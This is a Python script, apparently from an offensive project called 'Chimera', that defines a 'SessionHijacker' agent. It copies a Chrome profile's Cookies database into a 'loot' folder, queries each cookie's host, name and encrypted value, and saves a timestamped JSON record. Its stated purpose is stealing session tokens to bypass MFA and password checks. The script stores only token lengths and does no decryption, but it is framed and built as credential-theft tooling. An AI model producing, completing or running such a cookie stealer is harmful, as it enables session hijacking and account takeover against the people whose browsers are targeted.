#!/home/dan/Chimera_Project/venv/bin/python3
import sys
import os
import json
import sqlite3
import shutil
from datetime import datetime

class SessionHijacker:
    """
    Agent 204: Identity & Token Cloner.
    Extracts session cookies from local browser databases to bypass MFA 
    and password requirements.
    """
    def __init__(self, target_user_profile):
        # Path to a browser's Cookie SQLite database (e.g., Chrome or Firefox)
        self.profile_path = target_user_profile
        self.loot_dir = "/home/dan/Chimera_Project/agents/204_Session_Hijacker/loot"
        os.makedirs(self.loot_dir, exist_ok=True)

    def extract_chrome_cookies(self):
        """Attempts to extract cookies from a Chrome-based SQLite DB."""
        cookie_db = os.path.join(self.profile_path, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_db):
            print(f"[!] Target DB not found: {cookie_db}")
            return None

        # We must copy the DB because Chrome locks it while running
        temp_db = os.path.join(self.loot_dir, "temp_cookies.db")
        shutil.copyfile(cookie_db, temp_db)

        cookies = []
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            # Query for host, name, and value (Note: values are encrypted on modern Windows/macOS)
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, name, value in cursor.fetchall():
                cookies.append({"host": host, "name": name, "token_len": len(value)})
            conn.close()
            os.remove(temp_db)
            return cookies
        except Exception as e:
            print(f"    [!] SQLite Error: {e}")
            return None

    def execute(self):
        print(f"--- [AGENT 204: SESSION TOKEN EXTRACTION - {self.profile_path}] ---")
        
        tokens = self.extract_chrome_cookies()
        
        if tokens:
            print(f"[+] Successfully indexed {len(tokens)} potential session tokens.")
            
            # Commit to Loot
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            loot_file = f"{self.loot_dir}/tokens_{timestamp}.json"
            
            with open(loot_file, 'w') as f:
                json.dump({
                    "timestamp": str(datetime.now()),
                    "source_profile": self.profile_path,
                    "tokens": tokens
                }, f, indent=4)
                
            print(f"[!!!] TOKEN INTELLIGENCE COMMITTED: {loot_file}")
            return tokens
        return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py <path_to_browser_profile>")
        sys.exit(1)
        
    profile = sys.argv[1]
    SessionHijacker(profile).execute()
